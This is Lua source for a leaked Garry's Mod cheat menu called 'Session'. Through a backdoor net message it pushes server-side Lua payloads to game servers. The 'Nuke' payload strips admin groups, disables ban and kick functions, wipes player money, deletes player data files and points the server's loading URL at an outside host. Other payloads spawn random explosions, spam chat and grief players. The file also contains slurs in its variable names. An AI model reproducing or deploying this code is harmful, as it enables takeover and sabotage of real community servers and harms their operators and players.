local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Porn Steps" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end

Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:net.SendToServerLua([[hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )]]) end " )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Activated, walk and like" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Armageddon" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local faggot = [[
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" ) 
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
                    explode:Spawn() 
                    explode:SetKeyValue( "iMagnitude", "500" ) 
                    explode:Fire( "Explode", 0, 0 ) 
                end)  
]]
net.Start(netKey)
net.WriteString( faggot )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Armageddon activated" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spammer" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
RainbowMike = {
"chat.AddText(Color(0,255,0), \" Owned by Jesus & Zilnix \")",
"chat.AddText(Color(0,0,255), \" Owned by Jesus & Zilnix \")",
"chat.AddText(Color(255,0,0), \" Owned by Jesus & Zilnix  \")",
"chat.AddText(Color(255,255,0), \" Owned by Jesus & Zilnix  \")",
"chat.AddText(Color(0,255,255), \" Owned by Jesus & Zilnix  \")",
"chat.AddText(Color(255,0,255), \" Owned by Jesus & Zilnix \")",
}
local chatrapemike = false
    Macro.DoClick = function()
        chatrapemike = !chatrapemike
        if( chatrapemike ) then
                timer.Create( "niggaspams", 0.1, 0, function()
                    net.Start(netKey)
                    net.WriteString( "for k,v in pairs(player.GetAll()) do v:net.SendToServerLua([["..table.Random(RainbowMike).."]]) end " )
                    net.WriteBit (1)
                    net.SendToServer()
                end )
        else
                timer.Destroy( "niggaspams" )

                
        end
    end
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Nuke" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 255, 0, 0 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local nuke = [[
    if( LeyAC ) then
        LeyAC = nil;
    end

timer.Create( "next_level_timer2", 20, 0, function()
    --Break some bad cmds
    local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
    --Break ULX
    if ULib then
        for k,v in pairs(player.GetAll()) do
            ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
        end
 
        for k,v in pairs(ULib.ucl.groups) do
            if k != "user" then
                ULib.ucl.removeGroup(k);
            end
        end
 
        for k,v in pairs(ULib.ucl.users) do
            v.group = "user"
        end
    end
    --Gamemode related
    if GAMEMODE.Name == "DarkRP" then
 
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("rp_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
            RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
        end)
    end
 
    if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
        //for k, v in pairs(player.GetAll()) do
        //end
    end
 
    if net.WriteString.find( GAMEMODE.Name:lower(), "stronghold" ) then
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
            RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
        end)
     
        local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )
     
        for k, v in pairs( fil ) do
            file.Delete( fil )
        end
    end
end)

if GetConVarnet.WriteString("sv_allowcslua") != "0" then
    RunConsoleCommand( "sv_allowcslua", "1" );
end

hook.Add("Think", "busted", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)

timer.Create( "next_level_timer", 5, 0, function()
    for k, v in pairs(player.GetAll()) do
        v:ConCommand("say Session is the best cheat !");
    end
end)

RunConsoleCommand("hostname", "SESSION MENU LEAKED BY FUCK UR MENU")
RunConsoleCommand( "sv_loadingurl", "http://uu.esy.es/zyqv6r7n/seized.html" )
]]
net.Start(netKey)
net.WriteString( nuke )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Server fucking nuked" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Set Giant" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( giant )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Everyone is giant" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Set Tall" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.2, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Everyone is tall" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Speedhack" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local speedhack = [[
hook.Add("Think", "speedhack", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( speedhack )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Speedhack activated" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Cancer" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 10, 0, function()
        RunConsoleCommand("say", "*cough*")
        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Spread the cancer :D" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 420 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Earthquake" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
net.Start(netKey)
net.WriteString(" for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end ")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Earthquake activated" )
end

--[[]]
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "2D Players" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "2D Players activated" )
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "..." )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "FullMenu", "] ", Color( 255, 255, 255 ), "" )
net.Start(netKey)
net.WriteString()
net.WriteBit()
net.SendToServer() 
end
    
hook.Add("HUDPaint", "Credits", function() draw.SimpleTextOutlined( "Garry's Mod Menu Downloaded on noxploit.pro | Enjoy your game !", "creditsfont", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/15, Color( 255, 255, 255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,160) )

end)

surface.CreateFont( "creditsfont", {  
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})


----------------------------------
end
concommand.Add("FullMenu", Session)
----------------------------------

else -- if steamid isn't authorized

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 50,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})

concommand.Add("fucked", function()
    local Popup = vgui.Create("DFrame")
        Popup:SetSize( ScrW(), ScrH() )
        Popup:SetPos( 0,0 )
        Popup:SetVisible( true )
        Popup:SetDraggable( false )
        Popup:SetTitle( "" )
        Popup:MakePopup()
        Popup:ShowCloseButton( false )
        Popup.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(0,0,0,200) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(240,0,0) )
        surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/6.5 )
        surface.SetTextColor(255,255,255) 
        surface.SetTextPos(w/5.10, h/2.40)
            surface.SetFont("PopupHFont")
            surface.SetTextPos(w/5.10, h/3)
            surface.DrawText("Error")
            surface.SetFont("PopupFont") 
            surface.SetTextPos(w/5.10, h/2.50)
            surface.DrawText( "You haven't buyed Session," )
            surface.SetTextPos(w/5.10, h/2.40)              
            surface.DrawText( "You can't use it," )
            surface.SetTextPos(w/5.10, h/2.30)
            surface.DrawText("If this an error please contact _hazzy or Piloot.")
    end 
    button = vgui.Create("DButton", Popup)
    button:SetSize(110,32.5)
    button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
    button:SetText("")
    button.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(255,255,255) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(80,180,240) ) 
        surface.DrawRect( 0+3,0+3, w-6,h-6 ) 
        surface.SetTextColor(255,255,255) 
        surface.SetFont("PopupFont") 
        surface.SetTextPos(24,5.5) 
        surface.DrawText( "Continue" ) 
    end 
    button.DoClick = function(s,w,h) 
        Popup:Close()
    end

end) 
RunConsoleCommand("fucked")
end

